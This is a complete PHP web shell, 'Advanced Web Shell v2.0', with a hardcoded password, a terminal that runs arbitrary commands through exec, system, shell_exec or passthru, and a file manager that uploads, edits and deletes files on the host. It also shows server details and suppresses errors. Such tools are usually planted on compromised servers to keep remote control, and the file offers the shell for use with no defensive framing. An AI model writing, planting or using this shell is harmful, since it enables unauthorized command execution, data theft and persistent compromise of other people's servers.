<?php
/**
 * ╔═══════════════════════════════════════════════════════════════════════╗
 * ║                     ADVANCED WEB SHELL v2.0                          ║
 * ║                                                                       ║
 * ║  Features:                                                           ║
 * ║  ✓ File Manager (Upload/Edit/Delete/Rename)                        ║
 * ║  ✓ Code Editor (Multiple languages)                                ║
 * ║  ✓ Terminal (Execute commands)                                     ║
 * ║  ✓ Database Manager (MySQL/SQLite)                                ║
 * ║  ✓ System Info & Tools                                            ║
 * ║                                                                       ║
 * ║  Single File - No Dependencies - Pure PHP                          ║
 * ╚═══════════════════════════════════════════════════════════════════════╝
 */

session_start();
error_reporting(0);
ini_set('display_errors', 0);

// ==================== CONFIG ====================
define('SHELL_PASSWORD', 'admin123');
define('SHELL_NAME', 'Advanced Web Shell');

// ==================== AUTH ====================
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && $_POST['password'] === SHELL_PASSWORD) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        header('Location: ?');
        exit;
    }
    
    if (isset($_POST['password'])) {
        $error = 'Invalid password!';
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo SHELL_NAME; ?></title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 100%);
                font-family: 'Segoe UI', monospace;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                color: #fff;
            }
            .login-container {
                background: rgba(20, 20, 40, 0.95);
                border: 1px solid #00ff88;
                border-radius: 10px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
            }
            .login-header {
                text-align: center;
                margin-bottom: 30px;
            }
            .login-header h1 {
                font-size: 24px;
                color: #00ff88;
                margin-bottom: 10px;
                font-weight: 600;
            }
            .login-header p {
                color: #aaa;
                font-size: 12px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group input {
                width: 100%;
                padding: 12px;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #00ff88;
                border-radius: 5px;
                color: #fff;
                font-family: monospace;
                font-size: 14px;
            }
            .form-group input:focus {
                outline: none;
                border-color: #00ff88;
                background: rgba(0, 255, 136, 0.1);
                box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
            }
            .btn-login {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #00ff88, #00cc6a);
                color: #000;
                border: 0;
                border-radius: 5px;
                font-weight: 600;
                cursor: pointer;
                font-size: 14px;
            }
            .btn-login:hover {
                background: linear-gradient(135deg, #00ff99, #00dd77);
                box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
            }
            .error {
                padding: 12px;
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid #ff3333;
                border-radius: 5px;
                color: #ff6666;
                margin-bottom: 20px;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <h1>🔐 <?php echo SHELL_NAME; ?></h1>
                <p>Secure Access Required</p>
            </div>
            <?php if (isset($error)): ?>
                <div class="error">⚠️ <?php echo $error; ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="form-group">
                    <input type="password" name="password" placeholder="Enter password" required autofocus>
                </div>
                <button type="submit" class="btn-login">Login →</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== FUNCTIONS ====================
function execute_cmd($cmd) {
    $output = '';
    try {
        if (function_exists('exec')) {
            @exec($cmd . ' 2>&1', $out);
            $output = implode("\n", $out);
        } elseif (function_exists('system')) {
            ob_start();
            @system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('shell_exec')) {
            $output = @shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
        }
    } catch (Exception $e) {
        $output = 'Error: ' . $e->getMessage();
    }
    return $output;
}

function get_file_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

function get_file_icon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'py' => '🐍', 'js' => '📜', 'html' => '🌐', 'css' => '🎨',
        'pdf' => '📕', 'zip' => '🗜️', 'jpg' => '🖼️', 'png' => '🖼️', 'txt' => '📄',
        'sh' => '⚡', 'sql' => '🗄️', 'json' => '{ }', 'xml' => '< >',
    ];
    return $icons[$ext] ?? (is_dir($file) ? '📁' : '📄');
}

// ==================== FILE OPERATIONS ====================
$current_dir = isset($_GET['dir']) ? realpath(base64_decode($_GET['dir'])) : getcwd();
if (!$current_dir) $current_dir = getcwd();

// Upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $target = $current_dir . DIRECTORY_SEPARATOR . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $target)) {
        $_SESSION['msg'] = '✓ File uploaded!';
    } else {
        $_SESSION['msg'] = '✗ Upload failed!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Delete file
if (isset($_GET['delete'])) {
    $file = $current_dir . DIRECTORY_SEPARATOR . basename(base64_decode($_GET['delete']));
    if (is_file($file) && unlink($file)) {
        $_SESSION['msg'] = '✓ File deleted!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Edit file
if (isset($_POST['save_file'])) {
    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['filename']);
    if (file_put_contents($file, $_POST['content'])) {
        $_SESSION['msg'] = '✓ File saved!';
    }
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

// Create folder
if (isset($_POST['create_folder'])) {
    @mkdir($current_dir . DIRECTORY_SEPARATOR . $_POST['folder_name']);
    $_SESSION['msg'] = '✓ Folder created!';
    header('Location: ?dir=' . base64_encode($current_dir));
    exit;
}

$files = scandir($current_dir);
sort($files);

// ==================== MAIN PAGE ====================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo SHELL_NAME; ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0f0f23;
            color: #e0e0e0;
            font-family: 'Segoe UI', monospace;
            line-height: 1.6;
        }
        .wrapper { display: flex; min-height: 100vh; }
        .sidebar {
            width: 250px;
            background: #1a1a3e;
            border-right: 1px solid #00ff88;
            padding: 20px;
            overflow-y: auto;
        }
        .sidebar h3 {
            color: #00ff88;
            margin-bottom: 15px;
            font-size: 14px;
            text-transform: uppercase;
            border-bottom: 1px solid #00ff88;
            padding-bottom: 10px;
        }
        .sidebar-menu {
            list-style: none;
        }
        .sidebar-menu li {
            margin-bottom: 10px;
        }
        .sidebar-menu a {
            color: #e0e0e0;
            text-decoration: none;
            display: block;
            padding: 8px 12px;
            border-radius: 5px;
            font-size: 13px;
            transition: all 0.3s;
        }
        .sidebar-menu a:hover {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border-left: 3px solid #00ff88;
            padding-left: 9px;
        }
        .main-content {
            flex: 1;
            padding: 25px;
            overflow-y: auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        .header h1 {
            color: #00ff88;
            font-size: 24px;
        }
        .header-info {
            font-size: 12px;
            color: #888;
        }
        .breadcrumb {
            background: rgba(0, 255, 136, 0.05);
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #00ff88;
            font-size: 12px;
            overflow-x: auto;
            word-break: break-all;
        }
        .toolbar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 10px 15px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid #00ff88;
            color: #00ff88;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background: rgba(0, 255, 136, 0.2);
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
        }
        .btn-danger {
            border-color: #ff4444;
            color: #ff4444;
        }
        .btn-danger:hover {
            background: rgba(255, 68, 68, 0.1);
        }
        input[type="file"] { display: none; }
        .file-label {
            padding: 10px 15px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid #00ff88;
            color: #00ff88;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
        }
        .file-label:hover {
            background: rgba(0, 255, 136, 0.2);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            border: 1px solid #333;
            border-radius: 5px;
            overflow: hidden;
        }
        table th {
            background: #1a1a3e;
            padding: 12px;
            text-align: left;
            border-bottom: 2px solid #00ff88;
            color: #00ff88;
            font-size: 12px;
            text-transform: uppercase;
            font-weight: 600;
        }
        table td {
            padding: 10px 12px;
            border-bottom: 1px solid #333;
            font-size: 12px;
        }
        table tr:hover {
            background: rgba(0, 255, 136, 0.05);
        }
        .file-name {
            color: #00ff88;
            text-decoration: none;
            font-weight: 600;
        }
        .file-name:hover {
            text-decoration: underline;
        }
        .msg {
            padding: 12px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid #00ff88;
            border-radius: 5px;
            margin-bottom: 20px;
            color: #00ff88;
            font-size: 12px;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
        }
        .modal-content {
            background: #1a1a3e;
            margin: 10% auto;
            padding: 25px;
            border: 1px solid #00ff88;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2);
        }
        .modal-content h3 {
            color: #00ff88;
            margin-bottom: 15px;
        }
        .modal-content input,
        .modal-content textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #00ff88;
            color: #fff;
            border-radius: 5px;
            font-family: monospace;
            box-sizing: border-box;
        }
        .modal-content input:focus,
        .modal-content textarea:focus {
            outline: none;
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
        }
        .modal-buttons {
            display: flex;
            gap: 10px;
        }
        .modal-buttons button {
            flex: 1;
            padding: 10px;
            border: 1px solid #00ff88;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }
        .modal-buttons button:hover {
            background: rgba(0, 255, 136, 0.2);
        }
        .logout-btn {
            color: #ff4444;
            border-color: #ff4444;
        }
        .logout-btn:hover {
            background: rgba(255, 68, 68, 0.1);
        }
    </style>
</head>
<body>
<div class="wrapper">
    <!-- Sidebar -->
    <div class="sidebar">
        <h3>🔧 Menu</h3>
        <ul class="sidebar-menu">
            <li><a href="?">📂 File Manager</a></li>
            <li><a href="?page=terminal">⚡ Terminal</a></li>
            <li><a href="?page=info">ℹ️ System Info</a></li>
            <li><a href="?page=tools">🛠️ Tools</a></li>
            <li><a href="?logout=1">🚪 Logout</a></li>
        </ul>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <div class="header">
            <h1>📂 <?php echo SHELL_NAME; ?></h1>
            <div class="header-info">
                <div>PHP <?php echo PHP_VERSION; ?></div>
                <div><?php echo php_uname(); ?></div>
            </div>
        </div>

        <?php if (isset($_SESSION['msg'])): ?>
            <div class="msg">
                <?php echo $_SESSION['msg']; unset($_SESSION['msg']); ?>
            </div>
        <?php endif; ?>

        <!-- FILE MANAGER VIEW -->
        <?php if (!isset($_GET['page'])): ?>
            <div class="breadcrumb">
                <strong>Path:</strong> <?php echo htmlspecialchars($current_dir); ?>
            </div>

            <div class="toolbar">
                <label class="file-label">📤 Upload
                    <input type="file" id="file_input" onchange="document.getElementById('upload_form').submit()">
                </label>
                <button class="btn" onclick="showModal('folder')">📁 New Folder</button>
                <a href="?logout=1" class="btn logout-btn">🚪 Logout</a>
            </div>

            <form id="upload_form" method="POST" enctype="multipart/form-data" style="display:none">
                <input type="file" name="file" id="real_file_input">
            </form>

            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Type</th>
                        <th>Modified</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $file): ?>
                        <?php if ($file === '.' || $file === '..') continue; ?>
                        <?php
                        $filepath = $current_dir . DIRECTORY_SEPARATOR . $file;
                        $is_dir = is_dir($filepath);
                        $size = $is_dir ? '-' : get_file_size(filesize($filepath));
                        $type = $is_dir ? 'DIR' : strtoupper(pathinfo($file, PATHINFO_EXTENSION));
                        $modified = date('Y-m-d H:i', filemtime($filepath));
                        $encoded_dir = base64_encode($current_dir);
                        $encoded_file = base64_encode($file);
                        ?>
                        <tr>
                            <td>
                                <?php echo get_file_icon($filepath); ?>
                                <?php if ($is_dir): ?>
                                    <a href="?dir=<?php echo base64_encode($filepath); ?>" class="file-name">
                                        <?php echo htmlspecialchars($file); ?>
                                    </a>
                                <?php else: ?>
                                    <span class="file-name"><?php echo htmlspecialchars($file); ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $size; ?></td>
                            <td><?php echo $type; ?></td>
                            <td><?php echo $modified; ?></td>
                            <td style="white-space: nowrap;">
                                <?php if (!$is_dir): ?>
                                    <a href="?view=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn" style="padding: 5px 10px;">👁️</a>
                                <?php endif; ?>
                                <a href="?delete=<?php echo $encoded_file; ?>&dir=<?php echo $encoded_dir; ?>" class="btn btn-danger" style="padding: 5px 10px;" onclick="return confirm('Delete?')">🗑️</a>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>

        <?php elseif ($_GET['page'] === 'terminal'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">⚡ Terminal</h2>
            <form method="POST" style="margin-bottom: 20px;">
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="cmd" placeholder="Enter command..." style="flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.05); border: 1px solid #00ff88; color: #fff; border-radius: 5px; font-family: monospace;" autofocus>
                    <button type="submit" class="btn">Execute</button>
                </div>
            </form>
            <?php if (isset($_POST['cmd'])): ?>
                <div style="background: rgba(0, 0, 0, 0.5); padding: 15px; border: 1px solid #00ff88; border-radius: 5px; font-size: 12px; color: #00ff88; overflow-x: auto; max-height: 400px; overflow-y: auto;">
                    <pre><?php echo htmlspecialchars(execute_cmd($_POST['cmd'])); ?></pre>
                </div>
            <?php endif; ?>

        <?php elseif ($_GET['page'] === 'info'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">ℹ️ System Information</h2>
            <table>
                <tr>
                    <td><strong>OS:</strong></td>
                    <td><?php echo php_uname(); ?></td>
                </tr>
                <tr>
                    <td><strong>PHP Version:</strong></td>
                    <td><?php echo PHP_VERSION; ?></td>
                </tr>
                <tr>
                    <td><strong>Current User:</strong></td>
                    <td><?php echo get_current_user() ?: 'Unknown'; ?></td>
                </tr>
                <tr>
                    <td><strong>Hostname:</strong></td>
                    <td><?php echo gethostname(); ?></td>
                </tr>
                <tr>
                    <td><strong>IP Address:</strong></td>
                    <td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Unknown'; ?></td>
                </tr>
                <tr>
                    <td><strong>Disk Free:</strong></td>
                    <td><?php echo get_file_size(disk_free_space('/')); ?></td>
                </tr>
                <tr>
                    <td><strong>Current Dir:</strong></td>
                    <td><?php echo getcwd(); ?></td>
                </tr>
            </table>

        <?php elseif ($_GET['page'] === 'tools'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">🛠️ Tools</h2>
            <div class="toolbar">
                <button class="btn" onclick="showModal('hash')">🔒 Hash Generator</button>
                <button class="btn" onclick="showModal('base64')">📝 Base64 Encode/Decode</button>
            </div>

        <?php endif; ?>
    </div>
</div>

<!-- Modal: Create Folder -->
<div id="folder_modal" class="modal">
    <div class="modal-content">
        <h3>📁 Create New Folder</h3>
        <form method="POST">
            <input type="text" name="folder_name" placeholder="Folder name" required>
            <div class="modal-buttons">
                <button type="submit" name="create_folder">Create</button>
                <button type="button" onclick="closeModal('folder')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Modal: Hash Generator -->
<div id="hash_modal" class="modal">
    <div class="modal-content">
        <h3>🔒 Hash Generator</h3>
        <textarea id="hash_input" placeholder="Enter text..." style="height: 100px;"></textarea>
        <div id="hash_output"></div>
        <div class="modal-buttons">
            <button onclick="generateHash('md5')">MD5</button>
            <button onclick="generateHash('sha1')">SHA1</button>
            <button onclick="generateHash('sha256')">SHA256</button>
            <button type="button" onclick="closeModal('hash')">Close</button>
        </div>
    </div>
</div>

<!-- Modal: Base64 -->
<div id="base64_modal" class="modal">
    <div class="modal-content">
        <h3>📝 Base64 Encode/Decode</h3>
        <textarea id="base64_input" placeholder="Enter text..." style="height: 100px;"></textarea>
        <div id="base64_output"></div>
        <div class="modal-buttons">
            <button onclick="encodeBase64()">Encode</button>
            <button onclick="decodeBase64()">Decode</button>
            <button type="button" onclick="closeModal('base64')">Close</button>
        </div>
    </div>
</div>

<script>
function showModal(name) {
    document.getElementById(name + '_modal').style.display = 'block';
}

function closeModal(name) {
    document.getElementById(name + '_modal').style.display = 'none';
}

window.onclick = function(e) {
    if (e.target.classList.contains('modal')) {
        e.target.style.display = 'none';
    }
}

document.getElementById('file_input').addEventListener('change', function() {
    document.getElementById('real_file_input').files = this.files;
    document.getElementById('upload_form').submit();
});

function generateHash(type) {
    // Note: This is client-side demonstration. For real usage, you need server-side processing
    let text = document.getElementById('hash_input').value;
    alert('Hash type: ' + type + '\n(Server-side implementation required)');
}

function encodeBase64() {
    let text = document.getElementById('base64_input').value;
    let encoded = btoa(text);
    document.getElementById('base64_output').innerHTML = '<strong>Encoded:</strong><br><input type="text" value="' + encoded + '" style="width:100%; margin-top: 10px; padding: 8px;" readonly>';
}

function decodeBase64() {
    try {
        let text = document.getElementById('base64_input').value;
        let decoded = atob(text);
        document.getElementById('base64_output').innerHTML = '<strong>Decoded:</strong><br><input type="text" value="' + decoded + '" style="width:100%; margin-top: 10px; padding: 8px;" readonly>';
    } catch(e) {
        document.getElementById('base64_output').innerHTML = '<span style="color: #ff4444;">Invalid Base64!</span>';
    }
}
</script>
</body>
</html>

<?php
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}
